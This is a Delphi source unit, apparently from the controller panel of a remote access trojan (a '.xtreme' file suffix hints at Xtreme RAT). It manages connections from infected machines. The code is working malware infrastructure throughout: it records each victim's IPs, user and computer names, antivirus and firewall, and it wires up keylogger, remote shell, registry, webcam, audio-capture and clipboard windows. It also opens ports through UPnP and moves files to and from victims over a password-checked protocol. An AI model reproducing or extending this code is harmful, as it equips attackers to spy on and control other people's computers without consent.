unit UnitConexao;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, SyncObjs, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, ExtCtrls, IdContext, IdThreadComponent,
  IdAntiFreezeBase, IdAntiFreeze, IdBaseComponent, IdComponent,
  IdCustomTCPServer, IdTCPServer, IdGlobal, IdIOHandler, IdSchedulerOfThreadDefault,
  AdvProgressBar, VirtualTrees, IdTCPConnection, IdYarn;

type
  pConexaoNew = ^TConexaoNew;
  TConexaoNew = class(TIdServerContext)
  private
    // we use critical section to ensure a single access on the connection
    // at a time
    _CriticalSection: TCriticalSection;
    _MasterIdentification: int64;
    _EnviandoString: boolean;
    _ValidConnection: boolean;
    _AContext: TConexaoNew;
    _Item: TListItem;
     _PassID: string;
    _ImagemBandeira: integer;
    _ImagemDesktop: integer;
    _DesktopBitmap: TBitmap;
    _GroupName: string;
    _ImagemCam: integer;
    _ImagemPing: integer;
    _SendPingTime: integer;
    _RAMSize: int64;
    _FontColor: integer;
    _RARPlugin: boolean;

    _NomeDoServidor: string;
    _Pais: string;
    _IPWAN: string;
    _IPLAN: string;
    _Account: string;
    _NomeDoComputador: string;
    _NomeDoUsuario: string;
    _CAM: string;
    _SistemaOperacional: string;
    _CPU: string;
    _RAM: string;
    _AV: string;
    _FW: string;
    _Versao: string;
    _Porta: string;
    _Ping: string;
    _Idle: string;
    _PrimeiraExecucao: string;
    _JanelaAtiva: string;

    _Node: PVirtualNode;
    _BrotherID: string;
    _ConnectionID: string;
    _WebcamList: string;

    _FormProcessos: TForm;
    _FormWindows: TForm;
    _FormServices: TForm;
    _FormRegedit: TForm;
    _FormShell: TForm;
    _FormFileManager: TForm;
    _FormClipboard: TForm;
    _FormListarDispositivos: TForm;
    _FormActivePorts: TForm;
    _FormProgramas: TForm;
    _FormDiversos: TForm;
    _FormDesktop: TForm;
    _FormWebcam: TForm;
    _FormAudioCapture: TForm;
    _FormCHAT: TForm;
    _FormKeylogger: TForm;
    _FormServerSettings: TForm;
    _FormMSN: TForm;
    _FormAll: TForm;

    _Transfer_Status: string;
    _Transfer_Velocidade: string;
    _Transfer_TempoRestante: string;
    _Transfer_ImagemIndex: integer;
    _Transfer_RemoteFileName: string;
    _Transfer_LocalFileName: string;
    _Transfer_RemoteFileSize: int64;
    _Transfer_RemoteFileSize_string: string;
    _Transfer_LocalFileSize: int64;
    _Transfer_LocalFileSize_string: string;
    _Transfer_VT: TVirtualStringTree;
    _Transfer_TransferPosition: int64;
    _Transfer_TransferPosition_string: string;
    _Transfer_TransferComplete: boolean;
    _Transfer_IsDownload: boolean; // if Download then = true / if Upload then = false

  public
    constructor Create(AConnection: TIdTCPConnection; AYarn: TIdYarn;
      AList: TIdContextThreadList = nil); override;
    destructor Destroy; override;
  public
    //procedure Lock;
    //procedure Unlock;
    procedure BroadcastBuffer(const ABuffer: TidBytes);
    procedure SendBuffer(const ABuffer: TidBytes; const AReceiverID: string);

    procedure EnviarString(Str: string);
    function ReceberString(NotifyWindow: THandle = 0): string;

    function TotalConnections: integer;
    function FindBrother(ConID: string): TIdContext;

    procedure DownloadFile(AContext: TConexaoNew);
    procedure UploadFile(AContext: TConexaoNew);
    procedure CreateTransfer(RemoteFile, LocalFile: string;
                               RemoteSize, LocalSize: int64;
                               xIsDownload: boolean;
                               VT: TVirtualStringTree);
  public
    property MasterIdentification: int64 read _MasterIdentification write _MasterIdentification;
    property AContext: TConexaoNew read _AContext write _AContext;
    property Item: TListItem read _Item write _Item;
    property ImagemBandeira: integer read _ImagemBandeira write _ImagemBandeira;
    property EnviandoString: boolean read _EnviandoString write _EnviandoString;
    property ValidConnection: boolean read _ValidConnection write _ValidConnection;
    property ImagemDesktop: integer read _ImagemDesktop write _ImagemDesktop;
    property DesktopBitmap: TBitmap read _DesktopBitmap write _DesktopBitmap;
    property GroupName: string read _GroupName write _GroupName;
    property ImagemCam: integer read _ImagemCam write _ImagemCam;
    property PassID: string read _PassID write _PassID;
    property ImagemPing: integer read _ImagemPing write _ImagemPing;
    property SendPingTime: integer read _SendPingTime write _SendPingTime;
    property RAMSize: int64 read _RAMSize write _RAMSize;
    property FontColor: integer read _FontColor write _FontColor;
    property NomeDoServidor: string read _NomeDoServidor write _NomeDoServidor;
    property Pais: string read _Pais write _Pais;
    property IPWAN: string read _IPWAN write _IPWAN;
    property IPLAN: string read _IPLAN write _IPLAN;
    property Account: string read _Account write _Account;
    property NomeDoComputador: string read _NomeDoComputador write _NomeDoComputador;
    property NomeDoUsuario: string read _NomeDoUsuario write _NomeDoUsuario;
    property CAM: string read _CAM write _CAM;
    property SistemaOperacional: string read _SistemaOperacional write _SistemaOperacional;
    property CPU: string read _CPU write _CPU;
    property RAM: string read _RAM write _RAM;
    property AV: string read _AV write _AV;
    property FW: string read _FW write _FW;
    property Versao: string read _Versao write _Versao;
    property Porta: string read _Porta write _Porta;
    property Ping: string read _Ping write _Ping;
    property Idle: string read _Idle write _Idle;
    property PrimeiraExecucao: string read _PrimeiraExecucao write _PrimeiraExecucao;
    property JanelaAtiva: string read _JanelaAtiva write _JanelaAtiva;
    property Node: PVirtualNode read _Node write _Node;
    property BrotherID: string read _BrotherID write _BrotherID;
    property ConnectionID: string read _ConnectionID write _ConnectionID;
    property WebcamList: string read _WebcamList write _WebcamList;
    property RARPlugin: boolean read _RARPlugin write _RARPlugin;
    property FormProcessos: TForm read _FormProcessos write _FormProcessos;
    property FormWindows: TForm read _FormWindows write _FormWindows;
    property FormServices: TForm read _FormServices write _FormServices;
    property FormRegedit: TForm read _FormRegedit write _FormRegedit;
    property FormShell: TForm read _FormShell write _FormShell;
    property FormFileManager: TForm read _FormFileManager write _FormFileManager;
    property FormClipboard: TForm read _FormClipboard write _FormClipboard;
    property FormListarDispositivos: TForm read _FormListarDispositivos write _FormListarDispositivos;
    property FormActivePorts: TForm read _FormActivePorts write _FormActivePorts;
    property FormProgramas: TForm read _FormProgramas write _FormProgramas;
    property FormDiversos: TForm read _FormDiversos write _FormDiversos;
    property FormDesktop: TForm read _FormDesktop write _FormDesktop;
    property FormWebcam: TForm read _FormWebcam write _FormWebcam;
    property FormAudioCapture: TForm read _FormAudioCapture write _FormAudioCapture;
    property FormCHAT: TForm read _FormCHAT write _FormCHAT;
    property FormKeylogger: TForm read _FormKeylogger write _FormKeylogger;
    property FormServerSettings: TForm read _FormServerSettings write _FormServerSettings;
    property FormMSN: TForm read _FormMSN write _FormMSN;
    property FormAll: TForm read _FormAll write _FormAll;

    property Transfer_Status: string read _Transfer_Status write _Transfer_Status;
    property Transfer_Velocidade: string read _Transfer_Velocidade write _Transfer_Velocidade;
    property Transfer_TempoRestante: string read _Transfer_TempoRestante write _Transfer_TempoRestante;
    property Transfer_ImagemIndex: integer read _Transfer_ImagemIndex write _Transfer_ImagemIndex;
    property Transfer_RemoteFileName: string read _Transfer_RemoteFileName write _Transfer_RemoteFileName;
    property Transfer_LocalFileName: string read _Transfer_LocalFileName write _Transfer_LocalFileName;
    property Transfer_RemoteFileSize_string: string read _Transfer_RemoteFileSize_string write _Transfer_RemoteFileSize_string;
    property Transfer_LocalFileSize_string: string read _Transfer_LocalFileSize_string write _Transfer_LocalFileSize_string;
    property Transfer_TransferPosition_string: string read _Transfer_TransferPosition_string write _Transfer_TransferPosition_string;
    property Transfer_RemoteFileSize: int64 read _Transfer_RemoteFileSize write _Transfer_RemoteFileSize;
    property Transfer_LocalFileSize: int64 read _Transfer_LocalFileSize write _Transfer_LocalFileSize;
    property Transfer_TransferPosition: int64 read _Transfer_TransferPosition write _Transfer_TransferPosition;
    property Transfer_TransferComplete: boolean read _Transfer_TransferComplete write _Transfer_TransferComplete;
    property Transfer_IsDownload: boolean read _Transfer_IsDownload write _Transfer_IsDownload;
    property Transfer_VT: TVirtualStringTree read _Transfer_VT write _Transfer_VT;
  end;

Const
  NewNodeSize = SizeOf(TConexaoNew);
  PBM_SETPOS     = WM_USER + 2;
  PBM_STEPIT     = WM_USER + 5;
  PBM_SETRANGE32 = WM_USER + 6;
  PBM_SETSTEP    = WM_USER + 4;

var
  ConnectionPass: int64;
  IdTCPServers: array [0..65535] of TIdTCPServer;
  IdSchedulerOfThreadDefault: array [0..65535] of TIdSchedulerOfThreadDefault;
  function IniciarNovaConexao(Porta: integer): boolean;
  procedure DesativarPorta(Porta: Integer);
  Function GetIPAddress: String;
  procedure AddUPnPEntry(LAN_IP: string; Port: Integer; const Name: ShortString);
  function DeleteUPnPEntry(Port: Integer): boolean;
  function CheckUPNPAvailable: boolean;

type
  TConnectionHeader = record
    Password: int64;
    PacketSize: int64;
  end;

implementation

uses
  UnitMain,
  UnitConstantes,
  unitStrings,
  ActiveX,
  ComObj,
  Winsock,
  UnitCompressString,
  UnitSelectPort,
  NATUPNPLib_TLB,
  UnitCommonProcedures;

type
  TNewUPnPEntry = class(TThread)
  private
    Port: integer;
    LAN_IP: string;
    Name: shortstring;
  protected
    procedure Execute; override;
  public
    constructor Create(xPort: integer; xLAN_IP: string; xName: shortstring);
  end;

constructor TNewUPnPEntry.Create(xPort: integer; xLAN_IP: string; xName: shortstring);
begin
  Port := xPort;
  LAN_IP := xLAN_IP;
  Name := xName;
  inherited Create(True);
end;

procedure TNewUPnPEntry.Execute;
var
  Upnp: UPnPNAT;
Begin
  UnitSelectPort.TerminouUPnP := False;
  DeleteUPnPEntry(Port);
  if (LAN_IP <> '127.0.0.1') and (LAN_IP <> 'localhost') and (LAN_IP <> '') then
  begin
    try
      CoInitialize(nil);
      Upnp := CoUPnPNAT.Create;
      Upnp.StaticPortMappingCollection.Add(port, 'TCP', port, LAN_IP, True, name);
      CoUnInitialize;
      Except
      FormMain.UseUPnP := False;
    end;
  end;
  UnitSelectPort.TerminouUPnP := True;
end;

Function GetIPAddress: String;
type
  pu_long = ^u_long;
var
  varTWSAData : TWSAData;
  varPHostEnt : PHostEnt;
  varTInAddr : TInAddr;
  namebuf : Array[0..255] of ansichar;
begin
  If WSAStartup($101,varTWSAData) <> 0 Then
  Result := ''
  Else Begin
    gethostname(namebuf,sizeof(namebuf));
    varPHostEnt := gethostbyname(namebuf);
    varTInAddr.S_addr := u_long(pu_long(varPHostEnt^.h_addr_list^)^);
    Result := inet_ntoa(varTInAddr);
  End;
  WSACleanup;
end;

procedure AddUPnPEntry(LAN_IP: string; Port: Integer; const Name: ShortString);
var
  NewUPnPEntry: TNewUPnPEntry;
begin
  NewUPnPEntry := TNewUPnPEntry.Create(Port, LAN_IP, Name);
  NewUPnPEntry.Resume;
end;

function DeleteUPnPEntry(Port: Integer): boolean;
var
  Upnp: UPnPNAT;
Begin
  result := false;
  try
    CoInitialize(nil);
    Upnp := CoUPnPNAT.Create;
    Upnp.StaticPortMappingCollection.Remove(port, 'TCP');
    except
    CoUnInitialize;
    exit;
  end;
  result := True;
end;

function CheckUPNPAvailable: boolean;
var
  Nat : Variant;
  Ports: Variant;
  foreach: IEnumVariant;
  enum: IUnknown;
  Port : OleVariant;
  b:cardinal;
begin
b:=0;
  result := True;
  CoInitialize(nil);
  try
    Nat := CreateOleObject('HNetCfg.NATUPnP');
    Ports := Nat.StaticPortMappingCollection;
    Enum := Ports._NewEnum;
    foreach := enum as IEnumVariant;
    foreach.Next(1, Port, b);
    except
    result := false;
  end;
  CoUnInitialize;
end;

function IniciarNovaConexao(Porta: integer): boolean;
begin
  result := false;
  if (Porta < 0) or (Porta > 65535) then exit;
  if IdTCPServers[porta] <> nil then exit;

  IdTCPServers[porta] := TIdTCPServer.Create;
  IdTCPServers[porta].ContextClass := TConexaoNew;
  IdSchedulerOfThreadDefault[porta] := TIdSchedulerOfThreadDefault.Create;
  IdTCPServers[porta].OnException := FormMain.IdTCPServer1.OnException;
  IdTCPServers[porta].OnExecute := FormMain.IdTCPServer1.OnExecute;
  IdTCPServers[porta].OnDisconnect := FormMain.IdTCPServer1.OnDisconnect;
  IdTCPServers[porta].OnConnect := FormMain.IdTCPServer1.OnConnect;
  IdTCPServers[porta].Scheduler := IdSchedulerOfThreadDefault[porta];

  IdTCPServers[porta].DefaultPort := Porta;
  try
    IdTCPServers[porta].Active := true;
    except
    IdTCPServers[Porta].Free;
    IdTCPServers[Porta] := nil;
    exit;
  end;

  result := true;
end;

procedure DesativarPorta(Porta: Integer);
var
  i, j: integer;
  ConAux: TConexaoNew;
begin
  if (IdTCPServers[Porta] <> nil) and (IdTCPServers[Porta].Active) then
  begin
    IdTCPServers[Porta].OnExecute := FormMain.IdTCPServerExecuteAlternative;
    IdTCPServers[Porta].OnConnect := FormMain.IdTCPServerConnectAlternative;
    //FormMain.DisconnectAll(Porta);

    MessageBox(0,
               pwidechar(Traduzidos[125] + ' ' + inttostr(Porta) + ' ' + traduzidos[126]),
               pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
               MB_OK or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);

    FormMain.AtualizarQuantidade;

    IdTCPServers[Porta].Active := False;
    IdTCPServers[Porta].Free;
    IdTCPServers[Porta] := nil;
    IdSchedulerOfThreadDefault[Porta].Free;
    IdSchedulerOfThreadDefault[porta] := nil;
  end else
  begin
    IdTCPServers[Porta].Free;
    IdTCPServers[Porta] := nil;
    IdSchedulerOfThreadDefault[Porta].Free;
    IdSchedulerOfThreadDefault[porta] := nil;
  end;
end;

procedure TConexaoNew.BroadcastBuffer(const ABuffer: TidBytes);
var
  Index: Integer;
  LClients: TList;
  LConexao: TConexaoNew;
begin
  LClients := FContextList.LockList;
  try
    for Index := 0 to LClients.Count -1 do begin
      LConexao := TConexaoNew(LClients[Index]);
      //LConexao.Lock;
      try
        LConexao.Connection.IOHandler.Write(ABuffer);
      finally
        //LConexao.Unlock;
      end;
    end;
  finally
    FContextList.UnlockList;
  end;
end;

constructor TConexaoNew.Create(AConnection: TIdTCPConnection; AYarn: TIdYarn;
  AList: TIdContextThreadList);
begin
  inherited Create(AConnection, AYarn, AList);
  _CriticalSection := TCriticalSection.Create;
  _EnviandoString := False;
  _RARPlugin := False;
  _AContext := Self;
  _Item := nil;
end;

function TConexaoNew.TotalConnections: integer;
begin
  with FContextList.LockList do Result := Count; FContextList.UnLockList;
end;

function TConexaoNew.FindBrother(ConID: string): TIdContext;
var
  Index: Integer;
  LClients: TList;
  LConexao: TConexaoNew;
begin
  Result := nil;
  LClients := FContextList.LockList;
  try
    for Index := 0 to LClients.Count -1 do begin
      LConexao := TConexaoNew(LClients[Index]);
      if LConexao.ConnectionID = ConID then
      begin
        Result := LClients[Index];
        Break;
      end;
    end;
  finally
    FContextList.UnlockList;
  end;
end;

destructor TConexaoNew.Destroy;
var
  LClients: TList;
  LConexao: TConexaoNew;
  Index: integer;
begin
  FreeAndNil(_CriticalSection);
  inherited;
end;
{
procedure TConexaoNew.Lock;
begin
  _CriticalSection.Enter;
end;

procedure TConexaoNew.Unlock;
begin
  _CriticalSection.Leave;
end;
}
procedure TConexaoNew.SendBuffer(const ABuffer: TidBytes; const AReceiverID: string);
var
  Index: Integer;
  LClients: TList;
  LConexao: TConexaoNew;
begin
  LClients := FContextList.LockList;
  try
    for Index := 0 to LClients.Count -1 do begin
      LConexao := TConexaoNew(LClients[Index]);
      if LConexao.ConnectionID = AReceiverID then begin
        //LConexao.Lock;
        try
          LConexao.Connection.IOHandler.Write(ABuffer);
        finally
          //LConexao.Unlock;
        end;
        Break;
      end;
    end;
  finally
    FContextList.UnlockList;
  end;
end;

procedure TConexaoNew.EnviarString(Str: string);
var
  Bytes, BytesHeader: TidBytes;
  ConnectionHeader: TConnectionHeader;
begin
  if MasterIdentification <> 1234567890 then Exit;
  if IdTCPServers[StrToInt(Porta)] = nil then Exit;

  Connection.CheckForGracefulDisconnect(false);
  if Connection.Connected = False then exit;

  Connection.IOHandler.CheckForDisconnect(false, true);
  if Connection.Connected = False then exit;

  Str := CompressString(Str);

  ConnectionHeader.Password := ConnectionPass;
  ConnectionHeader.PacketSize := Length(Str) * 2; //UNICODE

  Bytes := RawToBytes(Str[1], ConnectionHeader.PacketSize);
  BytesHeader := RawToBytes(ConnectionHeader, SizeOf(TConnectionHeader));

  while (EnviandoString = True) and (Connection.Connected = True) do Application.ProcessMessages;

  if Connection.Connected = True then
  begin
    //Lock;
    EnviandoString := True;
    try
      Connection.IOHandler.WriteLn('X');
      Connection.IOHandler.Write(BytesHeader, SizeOf(TConnectionHeader));
      Connection.IOHandler.Write(Bytes, ConnectionHeader.PacketSize);
      finally
      EnviandoString := False;
      Connection.IOHandler.WriteBufferClear;
      //Unlock;
    end;
  end;
end;

function TConexaoNew.ReceberString(NotifyWindow: THandle = 0): string;
var
  Bytes, BytesHeader: TidBytes;
  ConnectionHeader: TConnectionHeader;
  currRead, Transfered: int64;
  MaxBufferSize: integer;
begin
  MaxBufferSize := 1024;
  result := '';

  if MasterIdentification <> 1234567890 then
  begin
    result := 'InvalidConnection';
    exit;
  end;

  if IdTCPServers[StrToInt(Porta)] = nil then Exit;

  ZeroMemory(@BytesHeader, SizeOf(BytesHeader));
  Connection.IOHandler.ReadBytes(BytesHeader, SizeOf(TConnectionHeader));
  BytesToRaw(BytesHeader, ConnectionHeader, SizeOf(TConnectionHeader));

  if ConnectionHeader.Password <> ConnectionPass then
  begin
    result := 'InvalidConnection';
    exit;
  end;

  if ConnectionHeader.PacketSize <= 0 then exit;

  if NotifyWindow = 0 then
  begin
    Connection.IOHandler.ReadBytes(Bytes, ConnectionHeader.PacketSize, True);
    SetLength(Result, ConnectionHeader.PacketSize div 2);
    BytesToRaw(Bytes, Result[1], ConnectionHeader.PacketSize);
  end else
  try
    Transfered := 0;
    PostMessage(NotifyWindow, PBM_SETRANGE32, 0, ConnectionHeader.PacketSize);
    PostMessage(NotifyWindow, PBM_SETPOS, 0, 0);

    while (Transfered < ConnectionHeader.PacketSize) and (Connection.Connected) do
    begin
       sleep(5);
       Application.ProcessMessages;
       if (ConnectionHeader.PacketSize - Transfered) >= MaxBufferSize then currRead := MaxBufferSize
       else currRead := (ConnectionHeader.PacketSize - Transfered);
       Connection.IOHandler.ReadBytes(Bytes, CurrRead, True);
       Transfered := Length(Bytes);
       PostMessage(NotifyWindow, PBM_SETPOS, Transfered, 0);
       Application.ProcessMessages;
    end;
    finally
    PostMessage(NotifyWindow, PBM_SETPOS, Transfered, 0);
    SetLength(Result, Transfered div 2);
    BytesToRaw(Bytes, Result[1], Transfered);
    Application.ProcessMessages;
  end;

  result := DeCompressString(Result);
  ZeroMemory(Bytes, Length(Bytes));
  ZeroMemory(BytesHeader, Length(BytesHeader));
  ZeroMemory(@ConnectionHeader, SizeOf(ConnectionHeader));
end;

procedure TConexaoNew.DownloadFile(AContext: TConexaoNew);
var
  AStream: TFileStream;
  hFile: cardinal;
  i: integer;
begin
  Self.AContext := AContext;

  if FileExists(Transfer_LocalFileName) = false then
  begin
    hFile := CreateFile(PChar(Transfer_LocalFileName), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);
    CloseHandle(hFile);
  end;
  try
    Transfer_Status := Traduzidos[127];
    Transfer_RemoteFileSize_string := FileSizeToStr(Transfer_RemoteFileSize);
    AStream := TFileStream.Create(Transfer_LocalFileName, fmOpenReadWrite + fmShareDenyNone);
    Astream.Seek(Transfer_LocalFileSize, 0);
    AContext.Connection.IOHandler.LargeStream := True;
	  AContext.Connection.IOHandler.ReadStream(AStream,
                                             Transfer_RemoteFileSize - Transfer_LocalFileSize,
                                             False,
                                             self);
    finally
    FreeAndNil(AStream);
    try
      AContext.Connection.Disconnect;
      except
    end;

    if Transfer_TransferPosition >= Transfer_RemoteFileSize then
    begin
      Transfer_Status := Traduzidos[128];
      Transfer_TempoRestante := '';
      Transfer_TransferComplete := True;
      DeleteFile(Transfer_LocalFileName + '.xtreme');
    end else
    begin
      Transfer_Status := Traduzidos[129];
      Transfer_TempoRestante := '';
      Transfer_TransferComplete := False;
    end;

  end;
end;

procedure TConexaoNew.UploadFile(AContext: TConexaoNew);
var
  AStream: TFileStream;
  hFile: cardinal;
  i: integer;
begin
  Self.AContext := AContext;

  if FileExists(Transfer_LocalFileName) = false then
  begin
    try
	    AContext.Connection.Disconnect;
      except
    end;
    exit;
  end;

  try
    Transfer_Status := Traduzidos[130];
    Transfer_RemoteFileSize_string := FileSizeToStr(Transfer_LocalFileSize);
    AStream := TFileStream.Create(Transfer_LocalFileName, fmOpenReadWrite + fmShareDenyNone);
    AContext.EnviarString(FMUPLOAD);
    AContext.Connection.IOHandler.LargeStream := True;
	  AContext.Connection.IOHandler.Write(AStream,
                                        Transfer_LocalFileSize,
                                        False,
                                        self);
    finally
    FreeAndNil(AStream);

    if Transfer_TransferPosition >= Transfer_LocalFileSize then
    begin
      Transfer_Status := Traduzidos[128];
      Transfer_TempoRestante := '';
      Transfer_TransferComplete := True;
    end else
    begin
      Transfer_Status := Traduzidos[129];
      Transfer_TempoRestante := '';
      Transfer_TransferComplete := False;
    end;
  end;
end;

procedure TConexaoNew.CreateTransfer(RemoteFile: string; LocalFile: string;
                                    RemoteSize: Int64; LocalSize: Int64;
                                    xIsDownload: Boolean;
                                    VT: TVirtualStringTree);
var
  Node: PVirtualNode;
  i: integer;
begin
  try
    Self.Transfer_VT := VT;
    if xIsDownload then Self.Transfer_Status := Traduzidos[127] else Self.Transfer_Status := Traduzidos[130];
    Self.Transfer_Velocidade := '0 KB/s';
    Self.Transfer_TempoRestante := '';
    if xIsDownload then Self.Transfer_ImagemIndex := 8 else Self.Transfer_ImagemIndex := 9;
    Self.Transfer_RemoteFileName := RemoteFile;
    Self.Transfer_RemoteFileSize := RemoteSize;
    Self.Transfer_RemoteFileSize_string := FileSizeToStr(RemoteSize);
    Self.Transfer_LocalFileName := LocalFile;
    Self.Transfer_LocalFileSize := LocalSize;
    Self.Transfer_LocalFileSize_string := FileSizeToStr(LocalSize);
    Self.Transfer_IsDownload := xIsDownload;
    Self.Transfer_TransferComplete := False;

    if Transfer_IsDownload then
    begin
      if Transfer_LocalFileSize > 0 then
      Self.Transfer_TransferPosition_string := IntToStr(round((Transfer_LocalFileSize / Transfer_RemoteFileSize) * 100)) + '%' else
      Self.Transfer_TransferPosition_string := '0%';
    end else
    Self.Transfer_TransferPosition_string := '0%';
  finally
    Self.Node := VT.AddChild(nil, Self);
  end;
end;

end.